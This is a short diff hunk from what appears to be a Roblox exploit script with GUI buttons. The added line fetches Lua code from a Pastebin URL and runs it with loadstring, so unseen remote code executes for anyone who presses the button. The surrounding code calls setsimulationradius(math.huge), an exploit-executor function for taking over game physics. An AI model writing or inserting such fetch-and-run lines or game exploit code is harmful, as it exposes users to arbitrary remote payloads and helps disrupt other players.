@@ -10875,6 +10875,7 @@ Execute_10.MouseButton1Down:Connect(function()
 	end
 
 	if inputs == 6 then
+	loadstring(game:HttpGet("https://pastebin.com/raw/fXwQRn7f"))()
 		game:GetService("RunService").RenderStepped:Connect(function()
     setsimulationradius(math.huge)
 end)
